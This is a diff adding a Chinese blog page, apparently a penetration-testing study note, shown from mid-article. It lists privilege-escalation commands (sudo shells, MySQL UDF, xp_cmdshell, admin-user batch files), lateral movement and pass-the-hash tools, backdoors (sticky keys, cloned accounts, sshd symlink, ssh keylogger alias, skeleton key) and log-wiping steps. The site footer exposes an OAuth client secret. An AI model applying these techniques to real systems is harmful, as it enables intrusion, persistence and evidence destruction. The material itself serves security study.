+<td>&#x2F;etc&#x2F;apache2&#x2F;apache2.conf；&#x2F;my.conf（mysql）；&#x2F;httpd&#x2F;conf&#x2F;httpd.conf（nginx）</td>
+</tr>
+<tr>
+<td>网络通信</td>
+<td>netstat -antup</td>
+</tr>
+<tr>
+<td>Arp缓存</td>
+<td>arp -e</td>
+</tr>
+<tr>
+<td>防火墙</td>
+<td>iptables</td>
+</tr>
+<tr>
+<td>敏感信息</td>
+<td>&#x2F;etc&#x2F;passwd；&#x2F;group；&#x2F;shadow</td>
+</tr>
+</tbody></table>
+<p>拿到相关信息之后，在Exp-db中用Search sploit进行搜集</p>
+<ul>
+<li><p>内核提权：脏牛漏洞CVE-2016-5195（适用所有Linux内核2.6.22-3.9之间，32、64位OS）；CVE-2019-13272（适用于内核4.10-5.1.17）；CVE-2022-0874脏管漏洞（匿名管道限制不严格）</p>
+</li>
+<li><p>服务漏洞：dirty_sock（脏袜）漏洞CVE-2019-7304，snap（包管理工具）本地提权（适用于snap版本2.28-2.37，ubuntu18.10&#x2F;18.04LTS&#x2F;16.04LTS&#x2F;14.04LTS）</p>
+</li>
+<li><p>环境变量提权：终端中输入命令，查找PATH进行执行，偷梁换柱</p>
+</li>
+<li><p>Hash：参考1.2中密码文件目录，格式为&#x3D;用户名:密码:UID:GID:else:用户主目录:默认的shell，如果其中的密码显示x则证明密码存放在&#x2F;shadow中，格式为&#x3D;用户名:hash(密码)：x：x：多少天后过期：x：x：过期日期：x</p>
+</li>
+<li><p>sudo滥用：</p>
+</li>
+</ul>
+<pre><code>sudo /etc/sudoers	//配置文件
+sudo /bin/bash;/usr/bin/awk &#39;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#39;
+sudo curl file:///etc/shadow
+find -exec /bin/sh \; -quit
+</code></pre>
+<ul>
+<li><p>定时任务提权：系统定时任务-&#x2F;etc&#x2F;crontab；用户定时任务-&#x2F;var&#x2F;spool&#x2F;cron；<code>crontab</code>查看定时任务（格式&#x3D;分：时：日：月：周：命令）</p>
+</li>
+<li><p>SUID提权：suid&#x3D;super uid；该权限作用于可执行文件上，谁执行后谁就成为属主，此时能够继承创建该文件的人的权限，但仅在运行时有用；</p>
+</li>
+<li><p>隐藏文件：.xx（以.开头的为隐藏文件），<code>find / -name &quot;.*&quot; -type f -exec ls -al &#123;&#125;\;2&gt;/dev/null</code></p>
+</li>
+<li><p>NFS提权：NFS网络文件系统，将目标home目录挂载到本地；<code>showmount -e IP</code>显示可挂载的盘—》在&#x2F;mnt下mkdir—》<code>mount IP:目标 /本地地址</code>—》查找&#x2F;etc&#x2F;passwd下相关UID&amp;GID—》创建对应的组和用户（<code>group add -g GID; adduser 名 -uid UID -gid GID</code>），用以使用该身份提权—》（可选）生成ssh，将公钥放置到目标挂载盘中，方便后续进入</p>
+</li>
+</ul>
+<h4 id="数据库应用提权"><a href="#数据库应用提权" class="headerlink" title="数据库应用提权"></a>数据库应用提权</h4><p>SQLmap即可</p>
+<ol>
+<li><p>在MySql中UDF（用户定义函数）存在于mysql&#x2F;lib&#x2F;plugin&#x2F;下，为udf.dll或udf.so；使用数据流ADS在命令行中进行目录创建<code>echo &quot;xx&quot; &gt;名 :: $INDEX_ALLOCATION</code>（mysql&gt;5.1时没有plugin文件，需要自己创建）</p>
+<p><code>select &#39;xxx&#39; into outfile &#39;C:\\名::$INDEX_ALLOCATION&#39;;</code>创建&#x2F;lib&#x2F;plugin目录</p>
+<ol>
+<li><p>创建临时表，设置一个BLOB（大型二进制文件）类型</p>
+</li>
+<li><p>插入值CONVERT（udf.dll的16进制，CHAR类型）</p>
+</li>
+<li><p>将数据库内容导出为<code>C:\mysql\xxx\lib\plugin\udf.dll</code></p>
+</li>
+<li><p>删除上述表</p>
+</li>
+<li><p><code>create FUNCTION cmdshell returns string soname&#39;udf.dll&#39;;</code></p>
+</li>
+<li><p>输入命令<code>select cmdshell(&quot;whoami&quot;);</code></p>
+</li>
+</ol>
+</li>
+</ol>
+<p>msf中：exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload模块</p>
+<ol start="2">
+<li>SQL server：使用<code>net user x x/add &amp; net localgroup administrators x /add</code>增加SA管理员账户，需要sysadmin权限，普通用户无法依靠SQL Server提权（有该权限的话就可以），需要开启xp_cmdshell SQL，语句如下:</li>
+</ol>
+<pre><code class="sql">EXEC sp_configure &#39;show advanced options&#39;,1
+GO
+RECONFIGURE
+GO
+EXEC sp_configure &#39;xp_cmdshell&#39;,1
+GO
+RECONFIGURE
+Go
+</code></pre>
+<p><code>exec master..xp_cmdshell &quot;dos命令&quot;</code>；其他类似存储过程<code>sqlserveragent、sp_oacrate、xp_regwrite</code></p>
+<ol start="3">
+<li>Postgresql：pg_hba.conf具有db的访问权限</li>
+</ol>
+<h4 id="FTP应用提权"><a href="#FTP应用提权" class="headerlink" title="FTP应用提权"></a>FTP应用提权</h4><p>在win下自带的ftp应用中如果权限过高<code>quote site exec net user temp temp /add </code>可以为系统添加temp用户。下面是相关FTP软件的提权</p>
+<ol>
+<li>Serv-U</li>
+</ol>
+<p>默认端口43958，默认管理用户<code>LocalAdministrator-#1@ak#.lk;0@P</code>，在webshell一般没有回显，返回状态<code>200 EXEC command successful</code>表示成功，密码保存在Serv-U目录下的<code>ServUAdmin.exe</code>中，Hex打开；</p>
+<p>或者修改配置文件，直接添加FTP用户；<code>ServUDaemon.ini</code>中保存了所有的ftp账户信息</p>
+<ol start="2">
+<li>G6 FTP</li>
+</ol>
+<p>默认监听端口8021，安装目录下<code>RemoteAdmin/Remote.ini</code>保存着远程管理账户信息，默认以MD5加密。之后使用LXC进行端口转发，本软件不支持远程连接，本地连接成功后新建最高权限FTP用户：</p>
+<p>新建User.bat，并上传，目的是为系统建立一个名为temp，密码为123456的管理员用户</p>
+<pre><code class="cmd">@echo off
+net user temp 123456 /add
+net localgroup administrators temp /add
+</code></pre>
+<ol start="3">
+<li>FileZilla</li>
+</ol>
+<p>默认端口14147，<code>FileZillaServer Interface.xml</code>保存的是所有FTP管理员信息，<code>FileZillaServer.xml</code>保存服务器所有FTP用户信息；默认情况下也不支持远程连接，同样需要端口转发；建立新用户之后并远程连接后：</p>
+<p>设置新用户路径为C盘—登录FTP将<code>C:\Windows\system32\sethc.exe</code>删除并替换为cmd.exe，也就是粘滞键</p>
+<ol start="4">
+<li>FlashFXP</li>
+</ol>
+<p>在其安装目录下，<code>Sites.dat、Stats.dat、quick.dat</code>中保留着历史信息—从服务器下载到本地—并复制到本地FlashFXP下替换—进入软件查看，使用星号密码查看器</p>
+<h4 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h4><ol>
+<li>3389远程桌面服务端口，RDP远程桌面协议，具体端口位置<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\</code>中的PortNumber属性代表终端连接的端口；防御：强口令、换端口；</li>
+<li>端口转发，工具LCX、reDuh</li>
+<li>启动项提权，参考权限维持</li>
+<li>DLL劫持，工具T00ls Lpk Sethc（利用system32下lpk.dll，因为每个exe运行时都要加载这个，且会判断当前文件夹中是否有该dll，没有则再跑到c盘下找）</li>
+</ol>
+<h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><p>打补丁、及时升级、定时杀毒、关闭危险端口、删除System32下敏感的EXE文件、删除不安全组件、安装一些服务器安全配置软件</p>
+<hr>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>横向移动指的是，在攻破Web服务器后，我们能够对其下内网中的其他机器进行访问与文件传输；这里我们通常指的是Win的域下环境</p>
+<p>利用windows内置工具</p>
+<ol>
+<li><p>IPC+Schtasks(计划任务)&#x2F;AT(老版Schtasks)&#x2F;SC</p>
+<p>IPC$共享命名管道的资源，用于进程间通信，端口135、445开的时候说明目标有该服务；一般来说域中密码基本一致，由域控管理，获得账户密码后，我们对域控进行横向操作</p>
+<ol>
+<li><code>net use \\域控IP\ipc$ /user:账号 &quot;密码&quot;</code>通常使用管理员账号，此时我们可以向域控进行文件传输，方便后续操作</li>
+</ol>
+</li>
+<li><p>SC创建服务执行<code>SC //IP createtest binpath=&quot; &quot; obj=&quot; &quot; password=&quot; &quot;</code></p>
+</li>
+<li><p>WMIC：<code>wmic /node:IP /user:用户 /password:密码 process call</code></p>
+</li>
+<li><p>WinRM：远程管理服务，默认监听5985-http、5986-https</p>
+</li>
+</ol>
+<p>利用外置工具</p>
+<ol>
+<li><p>PsExec.exe、PsExec.py,搭配smbexec.py</p>
+</li>
+<li><p>Wmiexec.vbs（csscript.exe）、wmcmd.exe、wmiHacker（免杀，445端口）</p>
+</li>
+<li><p>pth-winexe：kali自带pth工具集；</p>
+<p>msf中<code>auxiliary/admin/smb/psexec_command</code>模块&amp;<code>exploit/windows/smb/psexec</code>模块；<code>auxiliary/admin/smb/ms17_010_command</code></p>
+</li>
+<li><p>Token窃取：</p>
+<p>win中包括授权D令牌（交互式会话登录）和模拟I令牌（非交互会话），均会在重启之后清除，D令牌所有者注销之后转换为I令牌；</p>
+<p>MSF中<code>load incognito</code>，ms14-068实现域内提权</p>
+<p>CS中hashdump、logonpasswords可用于获取凭证，Portscan可以扫描存活主机，也可以手动引入incognito.exe</p>
+</li>
+<li><p>SharpRDP：impacket套件</p>
+</li>
+</ol>
+<p><strong>域内横向移动</strong>：</p>
+<p>win的认证机制：本地认证、网络认证、域认证；</p>
+<p>在网络认证中主要用于_质询（chalenge&amp;response）_协议（NTLM v1&#x2F;v2&#x2F;session v2）；具体步骤如下;</p>
+<ol>
+<li>客户端向服务端发送请求，</li>
+<li>服务端对客户端验证确实有该用户后，随机生成challenge，再challenge1&#x3D;hash(用户名，challenge)存到内存，返回challenge</li>
+<li>客户端收到challenge通过协商好的算法进行response&#x3D;hash(用户名，challenge)</li>
+<li>客户端发送response与服务端的challenge1对比验证</li>
+</ol>
+<p>域认证基于Kerberos协议：客户向KDC申请，KDC中的AS（检查服务）进行检查生成AD，验证成功之后返回TGT给客户；如果客户想要访问特定服务器需要再次向KDC申请，其中的TGS判断权限合格后返回特定的Ticket</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Ticket</td>
+<td>凭证</td>
+</tr>
+<tr>
+<td>KDC</td>
+<td>密钥分发中心</td>
+</tr>
+<tr>
+<td>TGT</td>
+<td>生成凭证，在内存中</td>
+</tr>
+<tr>
+<td>AD</td>
+<td>存储NTLM hash</td>
+</tr>
+<tr>
+<td>TGS</td>
+<td>票据授予服务</td>
+</tr>
+</tbody></table>
+<p>PTH：哈希传递攻击（445端口、SMB、admin$共享）；msf中<code>auxiliary/admin/smb/psexec_command</code>和用于域和工作组的<code>exploit/windows/smb/psexec</code>；minikatz、powershell、CS、Impacket套件中的wmiexec.py&amp;smbexec.py均可以用于PTH；</p>
+<p>其他还有PTK密钥传递攻击、PTT票据传递攻击</p>
+<hr>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="Win下权限维持"><a href="#Win下权限维持" class="headerlink" title="Win下权限维持"></a>Win下权限维持</h4><p>后门安装包含注册表后门（persistence）&amp;服务后门（metsvc）【msf模块】</p>
+<ol>
+<li><p>首先上传vbs，修改为自启动，无需认证</p>
+</li>
+<li><p><code>run metsvc -A</code>设置上述脚本为开机自启动服务型后门（31337端口）</p>
+<p><code>use exploit/multi/handler</code>&amp;<code>set payload windows/metsvc_bind_tcp</code></p>
+</li>
+<li><p>AutorunScript获取shell时自动执行该持续化脚本</p>
+</li>
+</ol>
+<ul>
+<li><p>系统工具替换后门（开机辅助工具）：narrator讲述人劫持、utilman辅助工具管理器等。</p>
+</li>
+<li><p>shift后门：登录windows时，按5次shift，将粘滞键</p>
+</li>
+</ul>
+<p>msf相关利用<code>post/windows/manage/sticky_keys</code>；原理：注册表&#x3D;<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>下寻找目标替换应用，添加<code>debugger</code>参数，将其赋值为后门木马路径</p>
+<p>同理可以更改Notepad，为其添加参数，使得Notepad退出之后能够后台运行后门木马。</p>
+<p>开机自启动注册表项：先后顺序如下</p>
+<p><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>—&gt;<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>—&gt;<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>—&gt;<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></p>
+<p>此外<code>\RunOne \RunServiceOnce \Runservices</code>只执行一次</p>
+<p>其他方式：</p>
+<ul>
+<li><p>快捷方式劫持，更改目标文件位置</p>
+</li>
+<li><p>账户隐藏xxx$（net user无法看到，但控制面板能看）</p>
+</li>
+<li><p>后门账号&#x2F;克隆账号（控制面板看不到但注册表一定能看）：</p>
+<ol>
+<li>创建$用户到admin组中</li>
+<li>admin对应的F值赋值给<code>$</code>用户（导出<code>$</code>用户的键值和F值以及admin的F值）</li>
+<li>将admin（F）赋值给$（F），之后删除<code>$</code>用户</li>
+<li>导入<code>$</code>用户的F和键值</li>
+</ol>
+</li>
+<li><p>文件夹启动：<code>C:\Users\Lenovo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p>
+</li>
+<li><p>服务后门：一般情况下杀软会进行拦截（Task-powershell脚本）</p>
+</li>
+</ul>
+<h4 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h4><ul>
+<li><p>软链接sshd：<code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oport=12345</code></p>
+<ol>
+<li><code>ssh root@IP -p 12345</code>输入任何密码就可以root登录</li>
+</ol>
+</li>
+<li><p>ssh server wrapper：<code>ssh-keygen -t rsa</code>将公钥送到目标靶机上</p>
+</li>
+<li><p>ssh key logger：在靶机.bashrc中添加<code>alias ssh=&#39;strace -o /tmp/sshpwd -&#39;date+%d%h%m%s&#39;.log -e read,write,connect -s2048 ssh&#39;</code>输入的所有键盘记录都会在log中存储</p>
+</li>
+<li><p>Vim中默认含有python扩展</p>
+</li>
+<li><p>alias后门：键盘记录；Crontab后门：定时任务</p>
+</li>
+<li><p>setuid：使文件打开者在使用时拿到所有者权限</p>
+<p>setgid：作用于目录，用户打开该目录后自动加入到该目录所属组</p>
+</li>
+<li><p>文件隐藏touch文件，隐藏权限<code>chattr +i/-i</code>给所属文件加锁用于防止删除</p>
+</li>
+<li><p>命令无痕模式：<code>set +o history</code>（上下键还有，history命令看不出来）</p>
+</li>
+<li><p>删除命令历史：<code>sed -i 100,$d,bash_history</code>删除100行之后的命令；指定行<code>history -d 100</code></p>
+</li>
+</ul>
+<h4 id="域内权限维持"><a href="#域内权限维持" class="headerlink" title="域内权限维持"></a>域内权限维持</h4><ul>
+<li>黄金票据伪造（PTT）</li>
+</ul>
+<p>条件：域名称+域SID+域的KRBTGT的账号密码的hash+伪造用户</p>
+<blockquote>
+<p>whoami &amp; minikatz lasdump::dcsync &#x2F;user:krbtge@域名</p>
+</blockquote>
+<ul>
+<li>minikatz中的Skeleton key</li>
+</ul>
+<p>无需重启，适用于winServer03-12（万能密码，不能该用户，默认‘minikatz’），权限在重新启动之后失效，需要安装<code>privilege::debug &amp;&amp; misc::skeleton</code></p>
+<ul>
+<li>SID history</li>
+</ul>
+<p>用于跟踪安全主体控制用户连接资源时的访问权限：当用户从A域到B域时，SID会变，但是SID History中会保留在A域中的权限；minikatz中<code>privilege::debug &amp;&amp; sid::patch &amp;&amp; sid::add /sam::名 /new:adminstrator</code></p>
+<hr>
+<h3 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h3><ul>
+<li>windows</li>
+</ul>
+<p>日志位置<code>C:\Windows\System32\winevt\Logs</code>||在win+r中键入<code>eventwr.msc</code>；该日志使用事件查看器打开，包含：应用程序运行记录（Application）、安全账号改动等（Security）、系统驱动和软件崩溃等（System）、设置setup、转发事件；</p>
+<p>wevtutil.exe用于检索、删除、导出等对日志的操作</p>
+<p>msf：<code>net user username /del</code>删除账号，<code>clearv</code>删除日志，<code>sessions -k</code>关闭所有的meterpreter，<code>run event_manager -i/-c</code>i看日志c删除日志</p>
+<p>停止记录日志：ps脚本的Invoke-phantOm，eventlog-&gt; svchost执行</p>
+<ul>
+<li>Linux（）</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>记录内容</th>
+<th>查看命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
+<td>所有成功的登录记录</td>
+<td>last</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
+<td>所有的失败的登陆记录</td>
+<td>lastb（无法修改，在root下删除）</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
+<td>最近登陆记录</td>
+<td>lastlog</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;run&#x2F;utmp</td>
+<td>当前登录用户的信息</td>
+<td>who</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log</td>
+<td>nginx日志</td>
+<td></td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;cron</td>
+<td>定时任务日志</td>
+<td></td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;secure</td>
+<td>授权、账户信息等</td>
+<td></td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"><i class="far fa-alien-monster"></i><i class="fa fa-tag"></i> 渗透</a>
+              <a href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag"><i class="far fa-alien-monster"></i><i class="fa fa-tag"></i> 网络</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/27/Misc/" rel="prev" title="Misc">
+                  <i class="fa fa-angle-left"></i> Misc
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/08/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BB%8B%E7%BB%8D/" rel="next" title="区块链介绍">
+                  区块链介绍 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Zy0t1</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">98k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:58</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdnjs.cloudflare.com/ajax/libs/ribbon.js/1.0.2/ribbon.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"Zy0t1","repo":"Zy0t1.github.io","client_id":"6c6f625308573e74f41b","client_secret":"04c1811c17f0554819f3dabcd6711bda56078cc9","admin_user":"Zy0t1","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"66d849327d0f0c634878aacc1d14f278"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  <!--音乐-->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script>
+  <div id="player" class="aplayer aplayer-withlist aplayer-fixed" data-id="8698753667" data-server="netease" data-type="playlist" data-order="random" data-fixed="true" data-listfolded="true" data-theme="#2D8CF0"></div>
+ <!--https://music.163.com/#/outchain/0/8698753667/-->
+
+</body>
+</html>
